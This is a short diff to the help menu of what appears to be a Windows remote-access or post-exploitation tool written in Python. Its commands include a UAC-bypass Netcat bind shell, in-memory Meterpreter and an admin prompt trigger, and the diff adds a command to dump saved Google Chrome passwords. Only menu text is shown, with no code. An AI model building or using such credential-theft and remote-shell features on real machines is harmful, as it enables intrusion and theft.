@@ -94,6 +94,7 @@ help = Style.BRIGHT + r"""
                     -. {dps} bshell - (UAC)* Netcat Bind Shell.
                     -. {dps} dropmsf - In Memory Meterpreter.
                     -. {dps} elevate - Administrator Prompt Trigger.
+                    -. {dps} chromedump - Dump Google Chrome Passwords.
 """. format(
     cmd = Style.BRIGHT + Fore.RED + "(CMD)" + Style.RESET_ALL,
     dps = Style.BRIGHT + Fore.GREEN + "(DPS)" + Style.RESET_ALL
